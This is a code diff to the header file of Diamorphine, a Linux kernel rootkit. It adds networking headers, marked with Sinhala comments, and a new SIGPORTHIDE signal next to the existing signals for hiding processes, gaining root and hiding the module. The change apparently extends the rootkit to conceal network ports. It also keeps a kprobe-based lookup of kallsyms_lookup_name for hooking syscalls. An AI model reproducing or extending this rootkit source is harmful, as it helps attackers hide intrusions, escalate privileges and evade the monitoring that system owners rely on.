@@ -1,3 +1,23 @@
+#ifndef __DIAMORPHINE_H
+#define __DIAMORPHINE_H
+
+#include <linux/sched.h>
+#include <linux/module.h>
+#include <linux/syscalls.h>
+#include <linux/dirent.h>
+#include <linux/slab.h>
+#include <linux/version.h>
+#include <linux/cred.h>
+#include <linux/proc_fs.h>
+#include <linux/fs.h>
+#include <linux/string.h>
+#include <linux/fdtable.h>
+
+// --- Port hiding සඳහා අවශ්ය headers ---
+#include <net/sock.h>
+#include <net/inet_sock.h>
+#include <linux/seq_file.h>
+
 unsigned long
 resolve_sym(char *symbol);
 
@@ -40,9 +60,10 @@ struct linux_dirent {
 #define MODULE_NAME "diamorphine"
 
 enum {
-	SIGINVIS = 31,
-	SIGSUPER = 64,
-	SIGMODINVIS = 63
+    SIGINVIS = 31,
+    SIGSUPER = 64,
+    SIGMODINVIS = 63,
+    SIGPORTHIDE = 62   // නව signal එක
 };
 
 #ifndef IS_ENABLED
@@ -60,6 +81,8 @@ flipswitch_func(void *target_func, void *hacked_func);
 #define KPROBE_LOOKUP 1
 #include <linux/kprobes.h>
 static struct kprobe kp = {
-	    .symbol_name = "kallsyms_lookup_name"
+        .symbol_name = "kallsyms_lookup_name"
 };
+#endif
+
 #endif
